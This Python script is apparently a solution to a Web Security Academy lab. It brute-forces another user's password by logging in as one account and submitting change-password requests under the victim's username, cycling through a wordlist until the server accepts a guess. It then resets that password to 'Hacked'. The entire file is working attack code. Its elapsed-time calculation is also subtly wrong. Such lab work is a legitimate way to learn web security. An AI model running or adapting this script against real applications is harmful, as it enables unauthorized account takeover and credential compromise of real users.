######################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Password brute-force via password change
#
# Steps: 1. Login with correct creds
#        2. Change username when requesting change password API
#        3. Repeat the process trying every password
#
######################################################################


###########
# imports
###########
import requests
import time
from colorama import Fore


############################################
# Function used to login with correct creds
############################################
def login(url, username, password):
    # set data to send via POST
    data = {
        "username": username,
        "password": password
    }
    
    try:
        # login
        res = requests.post(url, data, allow_redirects=False)
        
    except:
        print(Fore.RED + "Failed to login as wiener through exception")

    # return response
    return res
    


###############################################
# Function used to request change-password API
###############################################
def change_password(url, session, username, current_password, new_password):
    # set data to send via POST
    data = {
        "username": username,
        "current-password": current_password,
        "new-password-1": new_password,
        "new-password-2": new_password
    }

    # set headers
    headers = {
        "Cookie": f"session={session}"
    }
    
    try:
        # change password
        res = requests.post(url, data, headers=headers, allow_redirects=False)

        # return response
        return res
    
    except:
        print(Fore.RED + "Failed change password request through exception")


###########
# Main
###########

# change this to your lab URL
url = "https://0ae100ac03e61af9821106d400380038.web-security-academy.net"

# change the file path of the password list
passwords = open("/home/ahmed/passwords", 'rt').read().splitlines()

# capture the time before brute forcing
start_time = time.time()

print(Fore.WHITE + "[#] Brute forcing password of " + Fore.GREEN + F"carlos..")

for (index, password) in enumerate(passwords):
    # login as wiener
    login_res = login(f"{url}/login", "wiener", "peter")
    
    # if you login successfully
    if login_res.status_code == 302:  
        # get session cookie
        session = login_res.cookies.get("session")  

        # set new password
        # chagne this to what you want
        new_password = "Hacked"  
        
        # try to change the password
        change_res = change_password(f"{url}/my-account/change-password", session, "carlos", password, new_password)  
        
        # if changing password is successful
        if change_res.status_code == 200:
            print(Fore.BLUE + f"\n[*] {password} => " + Fore.GREEN + "Correct")
            print(Fore.WHITE + f"[#] Password changed to: " + Fore.GREEN + new_password)
            
            break
        
        else:
            print(Fore.BLUE + f"[*] {password:10} => " + Fore.RED + "Incorrect", end='\r', flush=True)
    
    else:
        print(Fore.RED + "Failed to login as wiener")

# calculate the elapsed time
elapsed_time = int(time.time() - start_time / 60)

print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + "minutes")
